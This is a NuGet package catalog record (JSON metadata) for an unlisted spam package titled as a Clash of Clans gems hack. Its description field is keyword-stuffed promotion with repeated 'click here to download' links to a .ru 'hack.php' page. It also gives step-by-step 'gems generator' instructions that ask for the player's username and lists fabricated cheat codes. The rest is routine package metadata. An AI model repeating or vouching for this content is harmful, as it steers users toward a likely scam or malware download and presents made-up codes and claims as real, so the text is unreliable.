{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-hack-working-2022-version-cot.4.4.15.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "553ec314-3469-45b5-84dd-b57a4f1cb4f5",
  "catalog:commitTimeStamp": "2022-01-29T00:00:28.9377769Z",
  "created": "2022-01-26T17:57:41.26Z",
  "description": "# _Clash Of Clans Gems hack Working 2022 Version cot\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n\nWhy? - Because the ultimate Clash of Clans Hack tool is right here, waiting for you to grab it! What this tool exactly is? - The tool is a cheat application. Clash of Clans cheats this guide help you and your game will hack to get free gems and gold. Cheats and hacks into your account you get a unique clans free gems. Clash of Clans Hack Mod cheat free gems privet server ⚠☢☣ The most asked question! I make Clash of Clan videos. ⚓ Please Like,Share And.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n · Download and install Clash of Clans Hack (unlimited money, gems, oils) APK version for Android. Join the battle, build a village and compete with other players around the world! Clash of Clans is probably the childhood of many people. With attractive tactical gameplay, you will be immersed in fierce battles between download: Strategy Games. Step #1: Visit the main page of the COC Gems Generator. Please click the generate now button and visit the main page of these tools. Step #2 Gives Username and Select Device. In this step, you need to give your clash of clans account username and select your device. Now click the next button. Step #3 Choose amounts of gems, Gold, Elixir and Dark elixir.  · Clash of clans gems, clash of clans hack apk, clash of clans hack download, clash of clans hack tool, Clash of Clans Hacks, free gems. Cheat Codes for Clash of Clans. To get Unlimited Gems in Clash of Clans use this Cheat Code - PKn-0c9db8a. To Hack Elixir use this Code - Fk-bb9c8. Clash of Clans Cheat for Coins - Vu-d16bdedf\n\nclash of clans gems hack app, clash of clans gems hack generator, clash of clans gems hack app download, clash of clans gems hack download, clash of clans gems hack mod apk, clash of clans gems hack 2021, clash of clans gems hack file, clash of clans gems hack ios, clash of clans gems hack apk download, clash of clans gems hack apk mod, clash of clans hack gems and coins, clash of clans hack gems android, clash of clans hack gems and, clash of clans gems cheat app, a clash of clans gem hack, clash of clans gems hack 2020, clash of clans gems hack apk, clash of clans gem box hack, gems clash of clans hack.blogspot, clash of clans buy gems hack, bluestacks clash of clans gem hack, clash of clans gems hack.com, clash of clans gem hack cydia source, clash of clans hack gems coins and elixir, clash of clans hack gems coins, clash of clans gems cheat code, clash of clans gem calculator hack, clash of clans hack gems cheats 100 free download no survey, clash of clans hack gems coc, clash of clans gems hack download link, clash of clans unlimited gems hack download, clash of clans gems hack version download, clash of clans free gems hack download for pc, clash of clans gem hack pc download, free clash of clans gems hack apk download for android, clash of clans gems cheat engine, clash of clans hack gems gold and elixir generator, clash of clans easy gems hack, clash of clans gems gold and elixir hack, how to hack clash of clans gems cheat engine, clash of clans easy gems cheat, clash of clans hack unlimited gems gold elixir dark elixir download, clash of clans gems hack free, clash of clans gems hack free online, clash of clans gems hack for ios, clash of clans hack gems free no download, clash of clans gems hack apk free download, clash of clans unlimited gems hack free download, clash of clans hack gems generator free download, free clash of clans gems hack, free gems clash of clans ios, free gems on clash of clans, clash of clans gems hack game guardian, clash of clans hack gems generator no human verification, clash of clans hack gems generator without human verification or survey, clash of clans hack gems generator online ios, clash of clans hack gems generator android, gem hack",
  "id": "_Clash-Of-Clans-Gems-hack-Working-2022-Version-cot",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:42.87Z",
  "listed": false,
  "packageHash": "CJjz1J2hX3jBqU/tLILVHf9+kGCkrAZZOgw3/URxmuo0hlpGMgKMh/28AV+Sp3OiRpbMX/sJvQT7l0juDHsVIw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11585,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Clash-Of-Clans-Gems-hack-Working-2022-Version-cot",
  "verbatimVersion": "4.4.15",
  "version": "4.4.15",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-hack-working-2022-version-cot.4.4.15.json#uooltkltkf.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1455,
      "fullName": "uooltkltkf.nuspec",
      "length": 4481,
      "name": "uooltkltkf.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-hack-working-2022-version-cot.4.4.15.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9470,
      "fullName": ".signature.p7s",
      "length": 9470,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}